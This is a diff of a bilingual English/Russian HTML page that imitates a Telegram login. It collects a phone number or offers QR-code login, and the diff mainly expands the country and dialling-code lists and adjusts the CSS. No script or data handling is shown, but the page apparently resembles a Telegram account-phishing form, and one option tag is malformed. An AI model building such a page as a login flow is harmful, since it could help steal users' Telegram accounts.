@@ -28,7 +28,7 @@
             background: #1e2a3a;
             border-radius: 12px;
             width: 100%;
-            max-width: 380px;
+            max-width: 400px;
             padding: 25px 20px;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
             text-align: center;
@@ -94,14 +94,14 @@
         }
 
         .country-code {
-            width: 90px; /* Увеличил ширину для кодов стран */
+            width: 100px;
             flex-shrink: 0;
         }
 
         .phone-number {
             flex: 1;
             min-width: 0;
-            font-size: 15px; /* Увеличил шрифт для лучшей читаемости */
+            font-size: 15px;
         }
 
         .btn-primary {
@@ -180,7 +180,6 @@
             text-decoration: underline;
         }
 
-        /* QR Code Section */
         .qr-section {
             display: none;
         }
@@ -207,13 +206,11 @@
             margin-bottom: 15px;
         }
 
-        /* Русская версия */
         .russian {
             display: none;
         }
 
-        /* Адаптация для очень маленьких экранов */
-        @media (max-width: 380px) {
+        @media (max-width: 400px) {
             .auth-pages__container {
                 padding: 20px 15px;
                 max-width: 100%;
@@ -256,13 +253,68 @@
                             <label class="input-label">Country</label>
                             <select class="select-input" id="country" onchange="updateCountryCode('en')">
                                 <option value="US" data-code="+1">United States</option>
-                                <option value="RU" data-code="+7">Russia</option>
-                                <option value="BY" data-code="+375">Belarus</option>
-                                <option value="UA" data-code="+380">Ukraine</option>
-                                <option value="KZ" data-code="+7">Kazakhstan</option>
+                                <option value="CA" data-code="+1">Canada</option>
+                                <option value="GB" data-code="+44">United Kingdom</option>
                                 <option value="DE" data-code="+49">Germany</option>
                                 <option value="FR" data-code="+33">France</option>
-                                <option value="GB" data-code="+44">United Kingdom</option>
+                                <option value="IT" data-code="+39">Italy</option>
+                                <option value="ES" data-code="+34">Spain</option>
+                                <option value="RU" data-code="+7">Russia</option>
+                                <option value="UA" data-code="+380">Ukraine</option>
+                                <option value="BY" data-code="+375">Belarus</option>
+                                <option value="KZ" data-code="+7">Kazakhstan</option>
+                                <option valuePL" data-code="+48">Poland</option>
+                                <option value="TR" data-code="+90">Turkey</option>
+                                <option value="CN" data-code="+86">China</option>
+                                <option value="JP" data-code="+81">Japan</option>
+                                <option value="KR" data-code="+82">South Korea</option>
+                                <option value="IN" data-code="+91">India</option>
+                                <option value="BR" data-code="+55">Brazil</option>
+                                <option value="MX" data-code="+52">Mexico</option>
+                                <option value="AU" data-code="+61">Australia</option>
+                                <option value="NZ" data-code="+64">New Zealand</option>
+                                <option value="ZA" data-code="+27">South Africa</option>
+                                <option value="EG" data-code="+20">Egypt</option>
+                                <option value="SA" data-code="+966">Saudi Arabia</option>
+                                <option value="AE" data-code="+971">UAE</option>
+                                <option value="IL" data-code="+972">Israel</option>
+                                <option value="SE" data-code="+46">Sweden</option>
+                                <option value="NO" data-code="+47">Norway</option>
+                                <option value="DK" data-code="+45">Denmark</option>
+                                <option value="FI" data-code="+358">Finland</option>
+                                <option value="NL" data-code="+31">Netherlands</option>
+                                <option value="BE" data-code="+32">Belgium</option>
+                                <option value="CH" data-code="+41">Switzerland</option>
+                                <option value="AT" data-code="+43">Austria</option>
+                                <option value="PT" data-code="+351">Portugal</option>
+                                <option value="GR" data-code="+30">Greece</option>
+                                <option value="CZ" data-code="+420">Czech Republic</option>
+                                <option value="HU" data-code="+36">Hungary</option>
+                                <option value="RO" data-code="+40">Romania</option>
+                                <option value="BG" data-code="+359">Bulgaria</option>
+                                <option value="RS" data-code="+381">Serbia</option>
+                                <option value="HR" data-code="+385">Croatia</option>
+                                <option value="SI" data-code="+386">Slovenia</option>
+                                <option value="SK" data-code="+421">Slovakia</option>
+                                <option value="LT" data-code="+370">Lithuania</option>
+                                <option value="LV" data-code="+371">Latvia</option>
+                                <option value="EE" data-code="+372">Estonia</option>
+                                <option value="IE" data-code="+353">Ireland</option>
+                                <option value="IS" data-code="+354">Iceland</option>
+                                <option value="LU" data-code="+352">Luxembourg</option>
+                                <option value="CY" data-code="+357">Cyprus</option>
+                                <option value="MT" data-code="+356">Malta</option>
+                                <option value="AR" data-code="+54">Argentina</option>
+                                <option value="CL" data-code="+56">Chile</option>
+                                <option value="CO" data-code="+57">Colombia</option>
+                                <option value="PE" data-code="+51">Peru</option>
+                                <option value="VE" data-code="+58">Venezuela</option>
+                                <option value="MY" data-code="+60">Malaysia</option>
+                                <option value="SG" data-code="+65">Singapore</option>
+                                <option value="TH" data-code="+66">Thailand</option>
+                                <option value="ID" data-code="+62">Indonesia</option>
+                                <option value="PH" data-code="+63">Philippines</option>
+                                <option value="VN" data-code="+84">Vietnam</option>
                             </select>
                         </div>
                         
@@ -271,12 +323,66 @@
                             <div class="phone-input-group">
                                 <select class="select-input country-code" id="countryCode">
                                     <option value="+1">+1</option>
-                                    <option value="+7">+7</option>
-                                    <option value="+375">+375</option>
-                                    <option value="+380">+380</option>
+                                    <option value="+44">+44</option>
                                     <option value="+49">+49</option>
                                     <option value="+33">+33</option>
-                                    <option value="+44">+44</option>
+                                    <option value="+39">+39</option>
+                                    <option value="+34">+34</option>
+                                    <option value="+7">+7</option>
+                                    <option value="+380">+380</option>
+                                    <option value="+375">+375</option>
+                                    <option value="+48">+48</option>
+                                    <option value="+90">+90</option>
+                                    <option value="+86">+86</option>
+                                    <option value="+81">+81</option>
+                                    <option value="+82">+82</option>
+                                    <option value="+91">+91</option>
+                                    <option value="+55">+55</option>
+                                    <option value="+52">+52</option>
+                                    <option value="+61">+61</option>
+                                    <option value="+64">+64</option>
+                                    <option value="+27">+27</option>
+                                    <option value="+20">+20</option>
+                                    <option value="+966">+966</option>
+                                    <option value="+971">+971</option>
+                                    <option value="+972">+972</option>
+                                    <option value="+46">+46</option>
+                                    <option value="+47">+47</option>
+                                    <option value="+45">+45</option>
+                                    <option value="+358">+358</option>
+                                    <option value="+31">+31</option>
+                                    <option value="+32">+32</option>
+                                    <option value="+41">+41</option>
+                                    <option value="+43">+43</option>
+                                    <option value="+351">+351</option>
+                                    <option value="+30">+30</option>
+                                    <option value="+420">+420</option>
+                                    <option value="+36">+36</option>
+                                    <option value="+40">+40</option>
+                                    <option value="+359">+359</option>
+                                    <option value="+381">+381</option>
+                                    <option value="+385">+385</option>
+                                    <option value="+386">+386</option>
+                                    <option value="+421">+421</option>
+                                    <option value="+370">+370</option>
+                                    <option value="+371">+371</option>
+                                    <option value="+372">+372</option>
+                                    <option value="+353">+353</option>
+                                    <option value="+354">+354</option>
+                                    <option value="+352">+352</option>
+                                    <option value="+357">+357</option>
+                                    <option value="+356">+356</option>
+                                    <option value="+54">+54</option>
+                                    <option value="+56">+56</option>
+                                    <option value="+57">+57</option>
+                                    <option value="+51">+51</option>
+                                    <option value="+58">+58</option>
+                                    <option value="+60">+60</option>
+                                    <option value="+65">+65</option>
+                                    <option value="+66">+66</option>
+                                    <option value="+62">+62</option>
+                                    <option value="+63">+63</option>
+                                    <option value="+84">+84</option>
                                 </select>
                                 <input type="tel" class="text-input phone-number" id="phoneNumber" placeholder="Phone number">
                             </div>
@@ -290,7 +396,6 @@
                         
                         <button class="btn-secondary" onclick="showQRCode('en')">Log in by QR Code</button>
 
-                        <!-- QR Code Section -->
                         <div class="qr-section" id="qrSection">
                             <p class="qr-instructions">Scan this QR code with your Telegram app</p>
                             <div class="qr-code">
@@ -334,13 +439,68 @@
                             <label class="input-label">Страна</label>
                             <select class="select-input" id="countryRu" onchange="updateCountryCode('ru')">
                                 <option value="RU" data-code="+7">Россия</option>
-                                <option value="BY" data-code="+375">Беларусь</option>
                                 <option value="UA" data-code="+380">Украина</option>
+                                <option value="BY" data-code="+375">Беларусь</option>
                                 <option value="KZ" data-code="+7">Казахстан</option>
                                 <option value="US" data-code="+1">США</option>
+                                <option value="CA" data-code="+1">Канада</option>
+                                <option value="GB" data-code="+44">Великобритания</option>
                                 <option value="DE" data-code="+49">Германия</option>
                                 <option value="FR" data-code="+33">Франция</option>
-                                <option value="GB" data-code="+44">Великобритания</option>
+                                <option value="IT" data-code="+39">Италия</option>
+                                <option value="ES" data-code="+34">Испания</option>
+                                <option value="PL" data-code="+48">Польша</option>
+                                <option value="TR" data-code="+90">Турция</option>
+                                <option value="CN" data-code="+86">Китай</option>
+                                <option value="JP" data-code="+81">Япония</option>
+                                <option value="KR" data-code="+82">Южная Корея</option>
+                                <option value="IN" data-code="+91">Индия</option>
+                                <option value="BR" data-code="+55">Бразилия</option>
+                                <option value="MX" data-code="+52">Мексика</option>
+                                <option value="AU" data-code="+61">Австралия</option>
+                                <option value="NZ" data-code="+64">Новая Зеландия</option>
+                                <option value="ZA" data-code="+27">Южная Африка</option>
+                                <option value="EG" data-code="+20">Египет</option>
+                                <option value="SA" data-code="+966">Саудовская Аравия</option>
+                                <option value="AE" data-code="+971">ОАЭ</option>
+                                <option value="IL" data-code="+972">Израиль</option>
+                                <option value="SE" data-code="+46">Швеция</option>
+                                <option value="NO" data-code="+47">Норвегия</option>
+                                <option value="DK" data-code="+45">Дания</option>
+                                <option value="FI" data-code="+358">Финляндия</option>
+                                <option value="NL" data-code="+31">Нидерланды</option>
+                                <option value="BE" data-code="+32">Бельгия</option>
+                                <option value="CH" data-code="+41">Швейцария</option>
+                                <option value="AT" data-code="+43">Австрия</option>
+                                <option value="PT" data-code="+351">Португалия</option>
+                                <option value="GR" data-code="+30">Греция</option>
+                                <option value="CZ" data-code="+420">Чехия</option>
+                                <option value="HU" data-code="+36">Венгрия</option>
+                                <option value="RO" data-code="+40">Румыния</option>
+                                <option value="BG" data-code="+359">Болгария</option>
+                                <option value="RS" data-code="+381">Сербия</option>
+                                <option value="HR" data-code="+385">Хорватия</option>
+                                <option value="SI" data-code="+386">Словения</option>
+                                <option value="SK" data-code="+421">Словакия</option>
+                                <option value="LT" data-code="+370">Литва</option>
+                                <option value="LV" data-code="+371">Латвия</option>
+                                <option value="EE" data-code="+372">Эстония</option>
+                                <option value="IE" data-code="+353">Ирландия</option>
+                                <option value="IS" data-code="+354">Исландия</option>
+                                <option value="LU" data-code="+352">Люксембург</option>
+                                <option value="CY" data-code="+357">Кипр</option>
+                                <option value="MT" data-code="+356">Мальта</option>
+                                <option value="AR" data-code="+54">Аргентина</option>
+                                <option value="CL" data-code="+56">Чили</option>
+                                <option value="CO" data-code="+57">Колумбия</option>
+                                <option value="PE" data-code="+51">Перу</option>
+                                <option value="VE" data-code="+58">Венесуэла</option>
+                                <option value="MY" data-code="+60">Малайзия</option>
+                                <option value="SG" data-code="+65">Сингапур</option>
+                                <option value="TH" data-code="+66">Таиланд</option>
+                                <option value="ID" data-code="+62">Индонезия</option>
+                                <option value="PH" data-code="+63">Филиппины</option>
+                                <option value="VN" data-code="+84">Вьетнам</option>
                             </select>
                         </div>
                         
@@ -349,12 +509,66 @@
                             <div class="phone-input-group">
                                 <select class="select-input country-code" id="countryCodeRu">
                                     <option value="+7">+7</option>
-                                    <option value="+375">+375</option>
                                     <option value="+380">+380</option>
+                                    <option value="+375">+375</option>
                                     <option value="+1">+1</option>
+                                    <option value="+44">+44</option>
                                     <option value="+49">+49</option>
                                     <option value="+33">+33</option>
-                                    <option value="+44">+44</option>
+                                    <option value="+39">+39</option>
+                                    <option value="+34">+34</option>
+                                    <option value="+48">+48</option>
+                                    <option value="+90">+90</option>
+                                    <option value="+86">+86</option>
+                                    <option value="+81">+81</option>
+                                    <option value="+82">+82</option>
+                                    <option value="+91">+91</option>
+                                    <option value="+55">+55</option>
+                                    <option value="+52">+52</option>
+                                    <option value="+61">+61</option>
+                                    <option value="+64">+64</option>
+                                    <option value="+27">+27</option>
+                                    <option value="+20">+20</option>
+                                    <option value="+966">+966</option>
+                                    <option value="+971">+971</option>
+                                    <option value="+972">+972</option>
+                                    <option value="+46">+46</option>
+                                    <option value="+47">+47</option>
+                                    <option value="+45">+45</option>
+                                    <option value="+358">+358</option>
+                                    <option value="+31">+31</option>
+                                    <option value="+32">+32</option>
+                                    <option value="+41">+41</option>
+                                    <option value="+43">+43</option>
+                                    <option value="+351">+351</option>
+                                    <option value="+30">+30</option>
+                                    <option value="+420">+420</option>
+                                    <option value="+36">+36</option>
+                                    <option value="+40">+40</option>
+                                    <option value="+359">+359</option>
+                                    <option value="+381">+381</option>
+                                    <option value="+385">+385</option>
+                                    <option value="+386">+386</option>
+                                    <option value="+421">+421</option>
+                                    <option value="+370">+370</option>
+                                    <option value="+371">+371</option>
+                                    <option value="+372">+372</option>
+                                    <option value="+353">+353</option>
+                                    <option value="+354">+354</option>
+                                    <option value="+352">+352</option>
+                                    <option value="+357">+357</option>
+                                    <option value="+356">+356</option>
+                                    <option value="+54">+54</option>
+                                    <option value="+56">+56</option>
+                                    <option value="+57">+57</option>
+                                    <option value="+51">+51</option>
+                                    <option value="+58">+58</option>
+                                    <option value="+60">+60</option>
+                                    <option value="+65">+65</option>
+                                    <option value="+66">+66</option>
+                                    <option value="+62">+62</option>
+                                    <option value="+63">+63</option>
+                                    <option value="+84">+84</option>
                                 </select>
                                 <input type="tel" class="text-input phone-number" id="phoneNumberRu" placeholder="Номер телефона">
                             </div>
@@ -368,7 +582,6 @@
                         
                         <button class="btn-secondary" onclick="showQRCode('ru')">Войти по QR-коду</button>
 
-                        <!-- QR Code Section Russian -->
                         <div class="qr-section" id="qrSectionRu">
                             <p class="qr-instructions">Отсканируйте этот QR-код в приложении Telegram</p>
                             <div class="qr-code">
